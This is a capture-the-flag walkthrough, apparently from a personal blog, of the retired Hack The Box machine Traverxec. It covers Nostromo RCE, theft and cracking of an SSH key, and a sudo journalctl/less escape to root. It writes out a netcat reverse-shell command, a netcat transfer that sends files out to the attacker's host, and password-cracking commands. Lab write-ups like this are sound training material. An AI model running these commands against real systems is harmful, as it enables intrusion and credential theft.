---
layout: default
---
## Traverxec
###### Retired April 2020
![](https://www.hackthebox.eu/storage/avatars/6ce5fcdd63f07a5ce91d0b8e4579b163.png)

Life is short. [Need to skip to root?](#root)

This was a machine with secrets everywhere. A hidden (,hidden?) directory and a tricky sizing trick with privesc to root.

The IP has been added to my ```/etc/hosts``` file as traverxec.htb. Starting with nmap, I did a quick portscan of all ports and got back hits on 22 and 80. A full scan of those ports revealed:

![](https://yaboygmoney.github.io/htb/images/traverxec/1.png)

The results show that port 80 is running Nostromo version 1.9.6. Some quick recon on the version shows that the particular version provides remote code execution (RCE) capability by exploiting a LFI vulnerability. There are several ways to exploit this vulnerability: manually is pretty easy via web requests, a [python script](https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py) is easier, and [Metasploit has a module](https://www.exploit-db.com/exploits/47573) that's easiest. I opted for the python exploit.

To get a shell, I needed a listener ready:

```bash
nc -nvlp 1234
```

and to make the call using the PoC code:

```bash
python exploit.py traverxec.htb 80 "nc 10.10.14.31 1234 -e /bin/bash"
```

![](https://yaboygmoney.github.io/htb/images/traverxec/shell.png)

The shell is created and I can see that I landed on the machine as www-data.

Initial enumeration didn't show much for any binary/SUID exploitation for privesc, but looking through the Nostromo configuration revealed an .htpasswd file with a hash inside. I cracked it and revealed a password ```Nowonly4me```. It didn't work for SSH as David, and it turns out I didn't really end up needing it at all. 

![](https://yaboygmoney.github.io/htb/images/traverxec/5.png)

The password was for a basic authentication prompt and would have been needed if I did the upcoming steps through a browser. Moving on.

The Nostromo configuration file located at ```/var/nostromo/conf/nhttpd.conf``` provided the necessary information for privesc to david. In the ```#BASIC AUTHENTICATION``` section, we can see that while optional, it is configured. We have the password from the .htpasswd file already. 

![](https://yaboygmoney.github.io/htb/images/traverxec/4.png)

Looking further down the file is the ```HOMEDIRS``` configuration. Reading the [documentation for nhttpd](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd), I learned that it's possible to share home directories for users with a leading ```~``` character followed by their name, for example ```http://traverxec.htb/~david/```.

The configuration also shows that it's possible to provide a ```public_www``` directory. I didn't have permission to list directories from David's home directory, but I could go straight to ```/home/david/public_www``` directory. 

![](https://yaboygmoney.github.io/htb/images/traverxec/6.png)

I shipped the compressed file back to my local machine using a netcat file transfer:

```bash
nc -w 3 10.10.14.31 1235 < backup-ssh-identity-files.tgz # On remote machine
nc -nvlp 1235 > ssh.tgz # On local machine
```

![](https://yaboygmoney.github.io/htb/images/traverxec/7.png)

and decompressed the contents. Inside was David's private SSH key.

![](https://yaboygmoney.github.io/htb/images/traverxec/8.png)

I tried to SSH with just the key, but SSH still wanted a password, and not the password cracked from earlier. To get the password, we can to carve it out of the key file.

I ran the key through ```ssh2john``` and kicked it out to a text file that ```john``` can work with. From there, I can run the text file through ```john```.

```bash
/usr/share/john/ssh2john.py home/david/.ssh/id_rsa > ssh2johnhash.txt
john ssh2johnhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

After a few seconds the hash is cracked and I'm given the password ```hunter```.

![](https://yaboygmoney.github.io/htb/images/traverxec/9.png)

Now I can SSH using the same command as earlier, but provide the password this time and I'm in.

```bash
ssh -i home/david/.ssh/id_rsa david@traverxec.htb
```

![](https://yaboygmoney.github.io/htb/images/traverxec/10.png)

Now for root.<a name="root"></a>

In david's home directory, there's a ```bin``` directory. One of the files called ```server-stats.sh``` ends with the line ```/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat```. This is our way in. 

![](https://yaboygmoney.github.io/htb/images/traverxec/11.png)

Here's the breakdown:
1. Since David owns this script, we can assume that every line in the script is able to be executed manually outside of the script.
2. The last line is run with root permissions.
3. The ```journalctl``` binary that is run as root actually runs on top of the ```less``` binary. It's possible to drop into a shell from within ```less``` (see [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/#sudo)).

So to get a root shell, all I have to do is run

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

But there's a very creative catch. The command prompt MUST be small enough that the entire script cannot be displayed on the screen to actually force the ```less``` binary to be necessary. So the above command should be ran in a tiny command prompt window.

Now I'm in a ```less``` environment. From here just type

```bash
!/bin/bash
```

![](https://yaboygmoney.github.io/htb/images/traverxec/12.png)

and a shell is executed under the context of root.

![](https://media.giphy.com/media/26FPqAHtgCBzKG9mo/giphy.gif)

Thanks for reading.

#### Keep trying
